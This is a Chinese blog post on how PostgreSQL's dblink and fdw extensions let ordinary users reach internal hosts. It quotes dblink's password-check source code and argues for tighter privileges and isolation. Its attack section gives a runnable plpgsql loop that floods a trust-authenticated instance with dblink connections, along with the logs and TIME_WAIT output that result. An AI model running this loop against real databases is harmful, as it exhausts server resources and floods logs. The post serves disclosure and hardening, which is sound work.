## 开放dblink , fdw带来的安全隐患  
##### [TAG 6](../class/6.md)
### 作者                                         
digoal                                          
### 日期                                          
2015-10-22                                                                  
### 标签                                                                                                                                                          
PostgreSQL , 安全 , fdw , dblink , 错误日志 , 攻击私网                       
----                                          
## 背景      
PostgreSQL 有些插件是支持网络访问的，比如dblink, fdw等，可以访问外部服务。  
如果开放这些插件，并且网络隔离没有做好的话，可能会带来一些安全隐患，比如通过这些插件，能够访问数据库主机内网的其他机器。  
## 正文  
如果你把超级用户开放给用户，危险更加严峻  
dblink_connect和dblink_connect_u的差别只是security invoker和security definer。他们的代码都是dblink_connect  
```  
 public | dblink_connect          | text                      | text                                                                   | normal | invoker  | volatile   | postgres | c        | dblink_connect          |   
 public | dblink_connect          | text                      | text, text                                                             | normal | invoker  | volatile   | postgres | c        | dblink_connect          |   
 public | dblink_connect_u        | text                      | text                                                                   | normal | definer  | volatile   | postgres | c        | dblink_connect          |   
 public | dblink_connect_u        | text                      | text, text                                                             | normal | definer  | volatile   | postgres | c        | dblink_connect          |   
```  
dblink_connect在建立连接前，会使用dblink_connstr_check检查本次连接是否使用了密码（即connstr中是否有password字段），只允许超级用户不提供密码建立DBLINK。见dblink_connstr_check函数内容。  
如果提供了password字段，则开始建立远端连接，建立完连接后，还会进行一次检测，这次用的是dblink_security_check函数，这次检查的是如果连接的用户远端数据库的pg_hba.conf中使用了trust认证，则表示未使用密码认证，同样这种情况值允许超级用户建立这样的DLBINK。如果是trust即：!PQconnectionUsedPassword(conn)为真，然后释放连接，并告警。  
看起来挺安全的，其实也有漏洞在里面，作为一个普通用户，可以利用这种插件不断的和远端数据库建立连接，（虽然实际上它不能连上），这会造成远端数据库不断的FORK进程，建立和断开连接（如果远端数据库是trust认证的话，想象一下如果本地有多个数据库实例，大多数用户会用trust认证，针对127.0.0.1端口，但是我建议大家不要这么干，还是用UNIX SOCKET吧，并且UNIX SOCKET一定要放在$PGDATA里面，并且设置为700属性）。我们知道PG是进程模式的，不断的fork，连接，断开，开销是比较大的。而且如果你审计了连接和断开日志，日志量会非常庞大。  
```  
/*  
 * For non-superusers, insist that the connstr specify a password.  This  
 * prevents a password from being picked up from .pgpass, a service file,  
 * the environment, etc.  We don't want the postgres user's passwords  
 * to be accessible to non-superusers.  
 */  
static void  
dblink_connstr_check(const char *connstr)  
{  
        if (!superuser())  
        {  
                PQconninfoOption *options;  
                PQconninfoOption *option;  
                bool            connstr_gives_password = false;  
                options = PQconninfoParse(connstr, NULL);  
                if (options)  
                {  
                        for (option = options; option->keyword != NULL; option++)  
                        {  
                                if (strcmp(option->keyword, "password") == 0)  
                                {  
                                        if (option->val != NULL && option->val[0] != '\0')  
                                        {  
                                                connstr_gives_password = true;  
                                                break;  
                                        }  
                                }  
                        }  
                        PQconninfoFree(options);  
                }  
                if (!connstr_gives_password)  
                        ereport(ERROR,  
                                  (errcode(ERRCODE_S_R_E_PROHIBITED_SQL_STATEMENT_ATTEMPTED),  
                                   errmsg("password is required"),  
                                   errdetail("Non-superusers must provide a password in the connection string.")));  
        }  
}  
#define DBLINK_GET_CONN \  
        do { \  
                        char *conname_or_str = text_to_cstring(PG_GETARG_TEXT_PP(0)); \  
                        rconn = getConnectionByName(conname_or_str); \  
                        if (rconn) \  
                        { \  
                                conn = rconn->conn; \  
                                conname = conname_or_str; \  
                        } \  
                        else \  
                        { \  
                                connstr = get_connect_string(conname_or_str); \  
                                if (connstr == NULL) \  
                                { \  
                                        connstr = conname_or_str; \  
                                } \  
                                dblink_connstr_check(connstr); \  
                                conn = PQconnectdb(connstr); \  
                                if (PQstatus(conn) == CONNECTION_BAD) \  
                                { \  
                                        msg = pstrdup(PQerrorMessage(conn)); \  
                                        PQfinish(conn); \  
                                        ereport(ERROR, \  
                                                        (errcode(ERRCODE_SQLCLIENT_UNABLE_TO_ESTABLISH_SQLCONNECTION), \  
                                                         errmsg("could not establish connection"), \  
                                                         errdetail_internal("%s", msg))); \  
                                } \  
                                dblink_security_check(conn, rconn); \  
                                if (PQclientEncoding(conn) != GetDatabaseEncoding()) \  
                                        PQsetClientEncoding(conn, GetDatabaseEncodingName()); \  
                                freeconn = true; \  
                        } \  
        } while (0)  
static void  
dblink_security_check(PGconn *conn, remoteConn *rconn)  
{  
        if (!superuser())  
        {  
                if (!PQconnectionUsedPassword(conn))  
                {  
                        PQfinish(conn);  
                        if (rconn)  
                                pfree(rconn);  
                        ereport(ERROR,  
                                  (errcode(ERRCODE_S_R_E_PROHIBITED_SQL_STATEMENT_ATTEMPTED),  
                                   errmsg("password is required"),  
                                   errdetail("Non-superuser cannot connect if the server does not request a password."),  
                                   errhint("Target server's authentication method must be changed.")));  
                }  
        }  
}  
```  
攻击例子：  
假设本地有一个数据库监听了1921端口，同时127.0.0.1地址为trust。  
```  
local   all             all                                     trust  
# IPv4 local connections:  
host    all             all             127.0.0.1/32            trust  
# IPv6 local connections:  
#host    all             all             ::1/128                 trust  
```  
在本地假设还有一个其他的数据库实例，1922端口，或者本地数据库也行，反正都能达到攻击目的。  
创建一个函数，连接到127.0.0.1  
```  
psql -p 1922  
postgres=> create or replace function dblink() returns void as $$                      
declare  
begin  
  perform dblink_connect('hostaddr=127.0.0.1 port=1921 user=postgres password=1');  
exception when others then   
return;   
end;  
$$ language plpgsql ;  
```  
创建一个攻击loop  
```  
postgres=> do language plpgsql                                                              
$$  
declare  
begin  
loop  
  perform dblink();  
end loop;  
end;  
$$;  
```  
开多个进程来攻击，会很爽。  
你会看到大量的日志如下：  
```  
2015-10-22 19:16:41.738 CST,"postgres","postgres",16167,"127.0.0.1:37869",5628c599.3f27,3,"idle",2015-10-22 19:16:41 CST,,0,LOG,00000,"disconnection: session time: 0:00:00.004 user=postgres database=postgres host=127.0.0.1 port=37869",,,,,,,,"log_disconnections, postgres.c:4511",""  
2015-10-22 19:16:41.739 CST,,,16168,"",5628c599.3f28,1,"",2015-10-22 19:16:41 CST,,0,LOG,00000,"connection received: host=127.0.0.1 port=37870",,,,,,,,"BackendInitialize, postmaster.c:4013",""  
2015-10-22 19:16:41.740 CST,"postgres","postgres",16168,"127.0.0.1:37870",5628c599.3f28,2,"authentication",2015-10-22 19:16:41 CST,2/12827,0,LOG,00000,"connection authorized: user=postgres database=postgres",,,,,,,,"PerformAuthentication, postinit.c:258",""  
2015-10-22 19:16:41.743 CST,"postgres","postgres",16168,"127.0.0.1:37870",5628c599.3f28,3,"idle",2015-10-22 19:16:41 CST,,0,LOG,00000,"disconnection: session time: 0:00:00.004 user=postgres database=postgres host=127.0.0.1 port=37870",,,,,,,,"log_disconnections, postgres.c:4511",""  
2015-10-22 19:16:41.743 CST,,,16169,"",5628c599.3f29,1,"",2015-10-22 19:16:41 CST,,0,LOG,00000,"connection received: host=127.0.0.1 port=37871",,,,,,,,"BackendInitialize, postmaster.c:4013",""  
2015-10-22 19:16:41.744 CST,"postgres","postgres",16169,"127.0.0.1:37871",5628c599.3f29,2,"authentication",2015-10-22 19:16:41 CST,2/12828,0,LOG,00000,"connection authorized: user=postgres database=postgres",,,,,,,,"PerformAuthentication, postinit.c:258",""  
```  
同时大量的tcp TIME_WAIT  
```  
[root@digoal pg_root_1921]# netstat -anp|grep TIMEWAIT  
[root@digoal pg_root_1921]# netstat -anp|grep 1921  
tcp        0      0 0.0.0.0:1921                0.0.0.0:*                   LISTEN      3082/postgres         
tcp        0      0 127.0.0.1:18236             127.0.0.1:1921              TIME_WAIT   -                     
tcp        0      0 127.0.0.1:18206             127.0.0.1:1921              TIME_WAIT   -                     
tcp        0      0 127.0.0.1:18160             127.0.0.1:1921              TIME_WAIT   -                     
tcp        0      0 127.0.0.1:18183             127.0.0.1:1921              TIME_WAIT   -                     
tcp        0      0 127.0.0.1:18240             127.0.0.1:1921              TIME_WAIT   -                     
tcp        0      0 127.0.0.1:18169             127.0.0.1:1921              TIME_WAIT   -                     
tcp        0      0 127.0.0.1:18172             127.0.0.1:1921              TIME_WAIT   -                     
tcp        0      0 127.0.0.1:18254             127.0.0.1:1921              TIME_WAIT   -                     
tcp        0      0 127.0.0.1:18157             127.0.0.1:1921              TIME_WAIT   -       
```  
所以安全无小事，权限收敛要做到位。  
调整pg_hba.conf和postgresql.conf还不够，用户还是可以继续攻击。  